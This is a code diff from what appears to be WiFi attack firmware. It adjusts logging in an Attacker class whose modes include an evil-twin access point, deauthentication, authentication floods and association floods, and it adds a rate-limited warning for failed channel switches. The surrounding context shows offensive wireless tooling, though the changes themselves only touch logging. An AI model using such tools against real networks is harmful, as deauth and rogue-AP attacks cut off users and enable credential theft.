@@ -60,9 +60,19 @@ void Attacker::startAttack(AttackMode mode) {
         snprintf(chStr, sizeof(chStr), "%d", (int)_etChannel);
         WiFi.apbegin(_etSSID, chStr);
         _etActive = true;
-        Log.log(LOG_ATTACK, "Evil twin started: SSID=%s ch=%d", _etSSID, _etChannel);
+        Log.log(LOG_ATTACK, "Evil twin: SSID=%s ch=%d", _etSSID, _etChannel);
     } else {
-        Log.log(LOG_ATTACK, "Attack started: mode=%d targets=%d", mode, _targetCount);
+        if (_targetCount > 0) {
+            char mac[18];
+            snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
+                _targets[0].bssid[0],_targets[0].bssid[1],_targets[0].bssid[2],
+                _targets[0].bssid[3],_targets[0].bssid[4],_targets[0].bssid[5]);
+            Log.log(LOG_ATTACK, "Atk mode=%d n=%d first=%s homeCh=%d",
+                    mode, _targetCount, mac, _homeChannel);
+        } else {
+            Log.log(LOG_ATTACK, "Atk mode=%d n=%d homeCh=%d",
+                    mode, _targetCount, _homeChannel);
+        }
     }
 }
 
@@ -120,7 +130,16 @@ void Attacker::_tickDeauth() {
 
     // Switch to target channel
     const Network* tnet = Scan.networkByBSSID(t.bssid);
-    if (tnet && tnet->channel > 0) wifi_set_channel(tnet->channel);
+    if (tnet && tnet->channel > 0) {
+        int cr = wifi_set_channel(tnet->channel);
+        if (cr != 0) {
+            static uint32_t _lastChErrLog = 0;
+            if (millis() - _lastChErrLog > 10000) {
+                _lastChErrLog = millis();
+                Log.log(LOG_WARN, "ch_switch ch=%d ret=%d", tnet->channel, cr);
+            }
+        }
+    }
 
     uint8_t buf[64];
     const uint8_t* da = (_mode == ATK_DEAUTH_BCAST ||
@@ -161,7 +180,7 @@ void Attacker::_tickAuthFlood() {
         yield();
     }
 
-    wifi_set_channel(_homeChannel);
+    wifi_set_channel(_homeChannel);  // restore AP channel
 }
 
 void Attacker::_tickAssocFlood() {
